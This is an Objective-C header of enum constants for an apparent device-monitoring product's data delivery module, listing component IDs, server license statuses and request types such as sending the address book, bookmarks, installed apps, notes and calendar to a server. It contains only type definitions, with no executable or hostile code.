//
//  DefDDM.h
//  DDM
//
//  Created by Makara Khloth on 10/13/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

typedef enum {
	kDDC_EDM								= 0,
	//
	kDDC_AddressbookManager					= 1,
	kDDC_ActivationManager					= 2,
	kDDC_RCM								= 3,
	kDDC_SyncTimeManager					= 4,
	kDDC_SyncCDManager						= 5,
	kDDC_RunningInstalledAppsManager		= 6,
	kDDC_BookmarksManager					= 7,
	kDDC_AppsProfileManager					= 8,
	kDDC_UrlsProfileManager					= 9,
	kDDC_ApplicationEngine					= 10,
	//
	kDDC_CalendarManager					= 11,
	kDDC_NoteManager						= 12,
	kDDC_SoftwareUpdateManager				= 13,
	kDDC_UpdateConfigurationManager			= 14,
	kDDC_IMVersionControlManager			= 15,
    kDDC_KeySnapShotRuleManager             = 16,
    kDDC_DeviceSettingsManager              = 17,
    kDDC_TemporalControlManager             = 18,
    kDDC_NetworkAlertManager                = 19
} DataDeliveryCaller;

typedef enum {
	kDDMRequestPriortyLow		= 0,
	kDDMRequestPriortyNormal	= 1,
	kDDMRequestPriortyHigh		= 2
} DDMRequestPriority;

// Can be able to use interchangable with ConnectionHistoryErrorType in DefConnectionHistory.h
typedef enum {
	kConnectionLogOK					= 0,
	kConnectionLogHttpError				= 1,
	kConnectionLogServerError			= 2,
	kConnectionLogApplicationError		= 3,
	kConnectionLogConnectionError		= 4,
	kConnectionLogPayloadError			= 5
} ConnectionLogError;

typedef enum {
	kDDMServerStatusOK					= 0,
	kDDMServerStatusUnknown				= 1,
	kDDMServerStatusLicenseNotFound		= 2,
	kDDMServerStatusDeviceIdNotFound	= 3,
	kDDMServerStatusLicenseExpired		= 4,
	kDDMServerStatusLicenseDisabled		= 5
} DDMServerStatus;

typedef enum {
	kEDPTypeUnknown							= 0,
	//
	kEDPTypePanic							= 1,
	kEDPTypeSystem							= 2,
	kEDPTypeAllRegular						= 3,
	kEDPTypeSettings						= 4,
	kEDPTypeActualMeida						= 5,
	kEDPTypeThumbnail						= 6,
	kEDPTypeActivate						= 7,
	kEDPTypeDeactivate						= 8,
	kEDPTypeRequestActivate					= 9,
	kEDPTypeSendHeartbeat					= 10,
	//
	kEDPTypeSendAddressbook					= 11,
	kEDPTypeSendAddressbookForApproval		= 12,
	kEDPTypeGetAddressbook					= 13,
	kEDPTypeGetTime							= 14,
	kEDPTypeGetCommunicationDirectives		= 15,
	kEDPTypeSendInstalledApps				= 16,
	kEDPTypeSendRunningApps					= 17,
	kEDPTypeSendBookmarks					= 18,
	kEDPTypeGetAppsProfile					= 19,
	kEDPTypeGetUrlProfile					= 20,
	//
	kEDPTypeSendAppsProfile					= 21,
	kEDPTypeSendUrlProfile					= 22,
	kEDPTypeGetConfig						= 23,
	kEDPTypeSendNote						= 24,
	kEDPTypeSendCalendar					= 25,
	kEDPTypeNTMedia							= 26,
	kEDPTypeGetBinary						= 27,
	kEDPTypeGetSupportIM					= 28,
    kEDPTypeSendSnapShotRules               = 29,
    kEDPTypeGetSnapShotRules                = 30,
    //
    kEDPTypeSendMonitorApplications         = 31,
    kEDPTypeGetMonitorApplications          = 32,
    kEDPTypeSendDeviceSettings              = 33,
    kEDPTypeSendTemporalControl             = 34,
    kEDPTypeGetTemporalControl              = 35,
    kEDPTypeSendNetworkAlert                = 36,
    kEDPTypeGetNetworkCriteria              = 37
    
} EDPType;

typedef enum {
	kDDMRequestExecutorStatusIdle				= 0,
	kDDMRequestExecutorStatusBusyWithRequest	= 1
} DDMRequestExecutorStatus;
